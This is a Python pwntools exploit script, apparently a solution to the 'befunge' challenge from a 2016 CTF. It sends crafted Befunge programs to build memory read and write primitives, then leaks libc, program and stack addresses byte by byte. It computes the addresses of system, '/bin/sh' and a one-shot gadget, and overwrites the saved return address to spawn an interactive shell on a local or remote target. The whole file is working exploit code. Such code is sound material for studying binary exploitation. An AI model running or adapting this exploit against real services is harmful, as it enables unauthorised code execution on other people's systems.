#!/usr/bin/env python

from pwn import *
import sys

count = 0

def sendCmd(cmd):
    global count
    r.sendlineafter(">",cmd)
    count += 1

def writeToStack(leak=False):
    payload  = '&&' 
    payload += '*'
    payload += '&+'
    if leak:
        payload += '&g' # read primitive
        payload += ','
    else:
        payload += '&p' # write primitive
    sendCmd(payload)
    
def exploit(r):
    global count
   
    # LEAK LIBC
    payload  = ("&&*&+&g,"*6).ljust(0x4f,"A")+"v"
    sendCmd(payload)
    
    # LEAK PROGRAM
    payload  = ("<"+"&&*&+&g,"*6).ljust(0x4f,"A")+"v"
    sendCmd(payload[::-1])
    
    # LEAK STACK
    payload = (">"+("&&*&+&g,"*6)).ljust(0x4f,"A")+"v"
    sendCmd(payload)

    # OVERWRITE _IO_putc_ptr 
    payload = ("<"+("&&&*&+&p"*6)).ljust(0x4f,"A")+"v"
    sendCmd(payload[::-1])

    payload = ("><"*0x28)
    sendCmd(payload)

    print "count is " +str(count)    
    for i in range(25-count):
        r.sendlineafter(">","><"*0x28)
    
    # LEAK LIBC
    libc_leak = 0x0
    r.recv(1) # eat space char
  
    for i in range(6):
        r.sendline(str(0x18fc419))
        r.sendline(str(0x1000)) # 0x18fc419000*0x1000 = 0x18fc419000
        r.sendline(str(0xeb0+i)) # 0x18fc419000+0xeb0 = 0x18fc419eb0
        r.sendline(str(0xb00bface))  # 0xffffffffb00bface*0x50 = 0xffffffe703be6060 ; 0xffffffe703be6060+0x18fc419eb0 = 0xffffffffffffff10     
        byte_leak = u32(r.recv(1).ljust(4,'\0')) # 0xffffffffffffff10+0x555555756040 = 0x10000555555755f50
        libc_leak += pow(0x10,(i*2))*byte_leak
    
    libc_base = libc_leak-0x6f690 
    malloc_hook = libc_base+0x3c4b10
    binsh = libc_base+0x18cd17
    system = libc_base+0x45390
    environ = libc_base+0x3c6f38 
    one_shot = libc_base+0xf1117

    log.success("libc base at: "+hex(libc_base))
    log.success("__malloc_hook at: "+hex(malloc_hook))
    log.success("binsh string at: "+hex(binsh))
    log.success("system@libc at: "+hex(system))
    log.success("__environ@libc at: "+hex(environ)) 
    log.success("one_shot at: "+hex(one_shot)) 

    program_leak = 0x0
    # LEAK PROGRAM
    for i in range(6):
        r.sendline(str(0x18fc419))
        r.sendline(str(0x1000)) # 0x18fc419000*0x1000 = 0x18fc419000
        r.sendline(str(0xf40+i)) # 0x18fc419000+0xeb0 = 0x18fc419eb0
        r.sendline(str(0xb00bface))  # 0xffffffffb00bface*0x50 = 0xffffffe703be6060 ; 0xffffffe703be6060+0x18fc419eb0 = 0xffffffffffffff10     
        byte_leak = u32(r.recv(1).ljust(4,'\0')) # 0xffffffffffffff10+0x555555756040 = 0x10000555555755f50
        program_leak += pow(0x10,(i*2))*byte_leak
    
    elf_base = program_leak-0x202040
    delta = libc_base-elf_base
    log.success("program at: "+hex(program_leak))
    log.success("elf_base at: "+hex(elf_base))
    log.success("delta found: "+hex(delta))

    # LEAK STACK # finish this!
    
    target_delta = environ-program_leak
    target_delta += 0x10000000000000000
    log.info("target delta: "+hex(target_delta)) 
    
    target_delta_2 = target_delta-0xffffffe703be6060
    log.info("target delta 2: "+hex(target_delta_2))
    stack_leak = 0x0
    for i in range(6):
        r.sendline(str(target_delta_2/0x100000))
        r.sendline(str(0x100000)) # 0x2ac39ea*0x100000 = 0x2ac39ea00000
        r.sendline(str(target_delta_2-(target_delta_2&0xfffffff00000)+i)) # 0x2ac39ea00000+0x97e98 = 0x2ac39ea97e98
        r.sendline(str(0xb00bface))  # 0xffffffffb00bface*0x50 = 0xffffffe703be6060 ; 0xffffffe703be6060+0x2ac39ea97e98 = 0x100002aaaa267def8   
        byte_leak = u32(r.recv(1).ljust(4,'\0')) # 0x100002aaaa267def8+0x555555756040 = 0x100007ffff7dd3f38
        stack_leak += pow(0x10,(i*2))*byte_leak
    #stack_base = stack_leak-0x20e38   # CAN'T RELIABLY LEAK STACK BASE FROM __ENVIRON
    #stack_base = stack_leak-0x20598
    #ret_addr = stack_base+0x20d48
    #log.success("stack base at: "+hex(stack_base)) 
    ret_addr = stack_leak-0xf0
    log.success("SRA at: "+hex(ret_addr)) 
   
 
    # OVERWRITE SRA
    
    target_delta = ret_addr-program_leak
    target_delta += 0x10000000000000000
    log.info("target delta: "+hex(target_delta))
    
    target_delta_2 = target_delta-0xffffffe703be6060
    log.info("target delta 2: "+hex(target_delta_2))
    for i in range(6):
        r.sendline(str((one_shot&(0xff*pow(0x10,2*i)))/pow(0x10,2*i)))
        r.sendline(str(target_delta_2/0x100000))
        r.sendline(str(0x100000))
        #r.sendline(str(0x97e98+0x822ae10+i))
        r.sendline(str(target_delta_2-(target_delta_2&0xfffffff00000)+i))
        r.sendline(str(0xb00bface))
    
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/home/vagrant/CTFs/mmactf16/befunge/befunge'], env={"LD_PRELOAD":""})
        print util.proc.pidof(r)
        pause()
        exploit(r)
